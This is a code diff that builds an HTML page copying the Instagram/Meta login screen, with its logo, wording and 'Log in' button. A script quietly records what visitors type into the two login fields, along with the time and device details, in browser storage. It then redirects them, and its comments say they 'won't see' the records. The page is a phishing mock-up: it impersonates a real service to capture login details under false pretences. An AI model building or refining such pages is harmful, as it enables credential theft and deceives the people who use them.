@@ -1,45 +1,201 @@
-<script>
-  const KEY = "session_logs";
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Login</title>
 
-  function getLogs() {
-    return JSON.parse(localStorage.getItem(KEY) || "[]");
-  }
+  <!-- Font -->
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600&display=swap" rel="stylesheet">
 
-  function saveLogs(logs) {
-    localStorage.setItem(KEY, JSON.stringify(logs));
-  }
-
-  function addSession(username1, username2) {
-    const logs = getLogs();
-
-    logs.unshift({
-      username1,
-      username2,
-      time: new Date().toLocaleString(),
-      device: navigator.userAgent
-    });
-
-    saveLogs(logs);
-  }
-
-  // Your HTML has 2 inputs with same id="username"
-  const usernameInputs = document.querySelectorAll("#username");
-
-  const loginBtn = document.getElementById("loginBtn");
-
-  loginBtn.addEventListener("click", () => {
-    const u1 = usernameInputs[0]?.value.trim() || "";
-    const u2 = usernameInputs[1]?.value.trim() || "";
-
-    if (!u1 || !u2) {
-      alert("Please fill both username fields.");
-      return;
+  <style>
+    *{
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+      font-family: "Inter", sans-serif;
     }
 
-    // Save session (no password)
-    addSession(u1, u2);
+    body{
+      background: #0f1720;
+      color: white;
+      min-height: 100vh;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      padding: 20px;
+    }
 
-    // Redirect user to a normal page (user will NOT see sessions)
-    window.location.href = "home.html";
-  });
-</script>
+    .container{
+      width: 100%;
+      max-width: 420px;
+      text-align: center;
+    }
+
+    .lang{
+      font-size: 14px;
+      opacity: 0.85;
+      margin-bottom: 35px;
+    }
+
+    .logo{
+      width: 72px;
+      height: 72px;
+      margin: 0 auto 35px;
+      display: block;
+    }
+
+    .input-box{
+      width: 100%;
+      padding: 16px 16px;
+      margin: 12px 0;
+      border-radius: 14px;
+      border: 1px solid rgba(255,255,255,0.14);
+      background: rgba(255,255,255,0.05);
+      color: white;
+      font-size: 16px;
+      outline: none;
+    }
+
+    .input-box::placeholder{
+      color: rgba(255,255,255,0.45);
+      font-weight: 400;
+    }
+
+    .login-btn{
+      width: 100%;
+      padding: 16px;
+      margin-top: 16px;
+      border: none;
+      border-radius: 28px;
+      background: #1877f2;
+      color: white;
+      font-size: 18px;
+      font-weight: 600;
+      cursor: pointer;
+      transition: 0.2s;
+    }
+
+    .login-btn:active{
+      transform: scale(0.98);
+      opacity: 0.9;
+    }
+
+    .forgot{
+      margin-top: 20px;
+      font-size: 16px;
+      font-weight: 500;
+      opacity: 0.9;
+      cursor: pointer;
+    }
+
+    .create-btn{
+      width: 100%;
+      padding: 14px;
+      margin-top: 45px;
+      border-radius: 28px;
+      border: 1px solid rgba(24, 119, 242, 0.9);
+      background: transparent;
+      color: #1877f2;
+      font-size: 18px;
+      font-weight: 600;
+      cursor: pointer;
+      transition: 0.2s;
+    }
+
+    .meta{
+      margin-top: 25px;
+      opacity: 0.55;
+      font-size: 16px;
+      font-weight: 500;
+    }
+  </style>
+</head>
+
+<body>
+
+  <!-- LOGIN PAGE -->
+  <div class="container" id="loginPage">
+    <div class="lang">English (UK)</div>
+
+    <img
+      class="logo"
+      src="https://upload.wikimedia.org/wikipedia/commons/9/96/Instagram.svg"
+      alt="Instagram Logo"
+    />
+
+    <input
+      class="input-box"
+      id="username"
+      type="text"
+      placeholder="Username, email address or mobile number"
+      required
+    />
+
+    <input
+      class="input-box"
+      id="username"
+      type="text"
+      placeholder="Username"
+      required
+    />
+
+    <button class="login-btn" id="loginBtn">Log in</button>
+
+    <div class="forgot">Forgotten password?</div>
+
+    <button class="create-btn">Create new account</button>
+
+    <div class="meta">∞ Meta</div>
+  </div>
+
+  <script>
+    // Save sessions in browser localStorage
+    const KEY = "session_logs";
+
+    function getLogs() {
+      return JSON.parse(localStorage.getItem(KEY) || "[]");
+    }
+
+    function saveLogs(logs) {
+      localStorage.setItem(KEY, JSON.stringify(logs));
+    }
+
+    function addSession(username1, username2) {
+      const logs = getLogs();
+
+      logs.unshift({
+        username1: username1,
+        username2: username2,
+        time: new Date().toLocaleString(),
+        device: navigator.userAgent
+      });
+
+      saveLogs(logs);
+    }
+
+    // Your HTML has 2 inputs with SAME id="username"
+    const usernameInputs = document.querySelectorAll("#username");
+    const loginBtn = document.getElementById("loginBtn");
+
+    loginBtn.addEventListener("click", () => {
+      const u1 = usernameInputs[0]?.value.trim() || "";
+      const u2 = usernameInputs[1]?.value.trim() || "";
+
+      if (!u1 || !u2) {
+        alert("Please fill both username fields.");
+        return;
+      }
+
+      // record session
+      addSession(u1, u2);
+
+      // redirect user (they won't see sessions)
+      window.location.href = "home.html";
+    });
+  </script>
+
+</body>
+</html>
